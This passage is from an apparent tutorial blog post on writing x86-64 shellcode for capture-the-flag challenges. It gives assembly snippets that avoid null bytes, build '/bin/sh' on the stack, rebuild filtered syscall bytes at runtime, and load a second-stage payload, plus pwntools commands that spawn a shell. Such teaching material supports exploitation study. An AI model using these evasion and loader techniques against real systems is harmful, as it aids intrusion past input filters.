+many great examples.</p><ol><li>Use <a href=/blog/shellcode-101-the-notes-i-wish-existed-when-i-started-learning-shellcode/#xor-instruction>xor instruction</a> instead of <code>mov</code></li></ol><p>This will use less bytes and not include null bytes.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln>1</span><span class=cl><span class=c1># bad
+</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>0</span>
+</span></span><span class=line><span class=ln>3</span><span class=cl>
+</span></span><span class=line><span class=ln>4</span><span class=cl><span class=c1># good
+</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=c1></span><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span>
+</span></span></code></pre></div><ol start=2><li>Use <a href=/blog/shellcode-101-the-notes-i-wish-existed-when-i-started-learning-shellcode/#push-pop>push and pop</a> instructions instead of <code>mov</code></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln>1</span><span class=cl><span class=nf>push</span> <span class=mi>0x70</span>
+</span></span><span class=line><span class=ln>2</span><span class=cl><span class=nf>pop</span> <span class=no>rax</span>
+</span></span><span class=line><span class=ln>3</span><span class=cl><span class=nf>syscall</span>
+</span></span></code></pre></div><ol start=3><li>Use shifting instructions</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln>1</span><span class=cl><span class=nf>mov</span>     <span class=no>rdi</span><span class=p>,</span> <span class=mi>0x68732f6e69622f6a</span>   <span class=c1>; move the 64-bit immediate into RDI (&#39;hs/nib/j&#39; in little-endian)
+</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=c1></span><span class=nf>shr</span>     <span class=no>rdi</span><span class=p>,</span> <span class=mi>8</span>                    <span class=c1>; logical right-shift RDI by 8 bits -&gt; zero-terminates the low byte
+</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=c1></span><span class=nf>push</span>    <span class=no>rdi</span>                       <span class=c1>; push the 64-bit value (now contains &#34;/bin/sh\0&#34; when viewed as bytes)
+</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=c1></span><span class=nf>push</span>    <span class=no>rsp</span>                       <span class=c1>; push current RSP (stack pointer)
+</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=c1></span><span class=nf>pop</span>     <span class=no>rdi</span>                       <span class=c1>; pop that value into RDI -&gt; RDI points at the pushed string
+</span></span></span></code></pre></div><h3 id=self-modifying-shellcode>Self modifying shellcode</h3><p>One time i was solving a ctf challenge, and it filters the <code>syscall</code> bytes
+<code>0F 05</code>. I wrote a shellcode that constructs the <code>syscall</code> bytes <code>0F 05</code> at
+runtime so it won&rsquo;t be filtered. The following code increments the <code>0e</code> by 1, so
+it becomes <code>0F</code> and this way it bypasses the filter.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln>1</span><span class=cl><span class=nf>inc</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rip</span><span class=p>]</span>
+</span></span><span class=line><span class=ln>2</span><span class=cl><span class=na>.byte</span> <span class=mi>0x0e</span><span class=p>,</span> <span class=mi>0x05</span>
+</span></span></code></pre></div><h3 id=nop-padding>NOP Padding</h3><p><code>nop</code> is an instruction that does nothing, sometimes you use it for padding,
+aligning or whatever reason, it is useful.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln> 1</span><span class=cl><span class=na>.global</span> <span class=no>_start</span>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>
+</span></span><span class=line><span class=ln> 3</span><span class=cl><span class=nl>_start:</span>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=c1># Your code here
+</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=c1></span>    <span class=nf>nop</span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=nf>nop</span>
+</span></span><span class=line><span class=ln> 7</span><span class=cl>    <span class=c1>#...
+</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=c1></span>    <span class=nf>nop</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=na>.fill</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0x90</span>    <span class=c1># 10 NOP instructions
+</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=c1></span>    <span class=c1># or
+</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=c1></span>    <span class=na>.rept</span> <span class=mi>10</span>
+</span></span><span class=line><span class=ln>13</span><span class=cl>        <span class=nf>nop</span>
+</span></span><span class=line><span class=ln>14</span><span class=cl>    <span class=na>.endr</span>
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=c1># More code here
+</span></span></span></code></pre></div><h2 id=multi-stage-shellcode>Multi stage shellcode</h2><p>Some times there will be input filtering that it is impossible to write
+shellcode to do anything meaningful. One way to solve this problem is a multi
+stage shellcode. Write a stage 1 shellcode &ldquo;Loader&rdquo; that its job is to load
+another shellcode. Only the stage 1 gets filtered.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln> 1</span><span class=cl><span class=nf>push</span> <span class=mi>0</span>
+</span></span><span class=line><span class=ln> 2</span><span class=cl><span class=nf>push</span> <span class=mi>0</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl><span class=nf>pop</span> <span class=no>rax</span>         <span class=c1># read syscall
+</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=c1></span><span class=nf>pop</span> <span class=no>rdi</span>         <span class=c1># stdin
+</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=nf>push</span> <span class=no>rsp</span>
+</span></span><span class=line><span class=ln> 7</span><span class=cl><span class=nf>pop</span> <span class=no>rsi</span>         <span class=c1># rsi = rsp (buffer)
+</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl><span class=nf>push</span> <span class=mi>100</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl><span class=nf>pop</span> <span class=no>rdx</span>
+</span></span><span class=line><span class=ln>11</span><span class=cl>
+</span></span><span class=line><span class=ln>12</span><span class=cl><span class=nf>syscall</span>
+</span></span><span class=line><span class=ln>13</span><span class=cl>
+</span></span><span class=line><span class=ln>14</span><span class=cl><span class=nf>jmp</span> <span class=no>rsp</span>
+</span></span></code></pre></div><h1 id=use-pwntools-when-possible>Use Pwntools when possible</h1><p>it has lots of functions that automates and eases the process of writing
+shellcode. sometimes you don&rsquo;t need to write shellcode at all, it does it for
+you. But first you have to understand how the <em>magic</em> works, if not you will
+waste a lot of time. <a href=https://docs.pwntools.com/en/stable/shellcraft.html>RTFM</a>.</p><h2 id=pwn-shellcraft>Pwn shellcraft</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=ln>1</span><span class=cl>pwn shellcraft -l <span class=c1>#List shellcodes</span>
+</span></span><span class=line><span class=ln>2</span><span class=cl>pwn shellcraft -l amd <span class=c1>#Shellcode with amd in the name</span>
+</span></span><span class=line><span class=ln>3</span><span class=cl>pwn shellcraft -f hex amd64.linux.sh <span class=c1>#Create in C and run</span>
+</span></span><span class=line><span class=ln>4</span><span class=cl>pwn shellcraft -r amd64.linux.sh <span class=c1>#Run to test. Get shell</span>
+</span></span></code></pre></div><h2 id=pwn-template>Pwn template</h2><p>i like to use <code>pwn template</code> command to generate a starting point for my
+challenges.</p><p>then use the <code>asm("")</code> function to write the shellcode instead of compiling and
+passing it by hand through the shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=ln>1</span><span class=cl><span class=n>stage1</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;# shellcode loader&#34;&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>2</span><span class=cl><span class=n>stage2</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;# actual shellcode&#34;&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>3</span><span class=cl>
+</span></span><span class=line><span class=ln>4</span><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>stage1</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>5</span><span class=cl><span class=n>pause</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>6</span><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>stage2</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>7</span><span class=cl>
+</span></span><span class=line><span class=ln>8</span><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></div><h2 id=gdb-debugger>GDB Debugger</h2><p>Using a debugger is essential. <code>gdb</code> is good but it lacks features, that is why i
+recommend using <code>pwndbg</code> or <code>gef</code> with it. they help with visualisation and
+provide functions that are useful for debugging.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=ln>1</span><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=s1># break points
+</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=s1>#...
+</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=s1>source /opt/gef/gef.py
+</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=s1>continue
+</span></span></span><span class=line><span class=ln>8</span><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span></code></pre></div><h1 id=references>References</h1><ul><li><a href=https://shell-storm.org/shellcode/index.html>https://shell-storm.org/shellcode/index.html</a></li><li><a href=https://pwn.college/program-security/program-security/>https://pwn.college/program-security/program-security/</a></li><li><a href=https://www.felixcloutier.com/x86/>https://www.felixcloutier.com/x86/</a></li><li><a href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">https://syscalls.mebeim.net/?table=x86/64/x64/latest</a></li><li><a href=https://www.abatchy.com/2017/04/shellcode-reduction-tips-x86>https://www.abatchy.com/2017/04/shellcode-reduction-tips-x86</a></li><li><a href=https://nets.ec/Shellcode/Null-free>https://nets.ec/Shellcode/Null-free</a></li><li><a href=https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/tools/pwntools.html>https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/tools/pwntools.html</a></li></ul></div></div><hr class=footer-linebreak><div class=container><span class="row justify-content-center meta" id=footer>Copyright © 2025 Youssef Hesham
+</span><script defer src=/js/custom.js></script><script defer src=https://static.cloudflareinsights.com/beacon.min.js data-cf-beacon='{"token": "b3c8a5cb03f0431988de232822b453c3"}'></script></div></div></div></div></body></html>
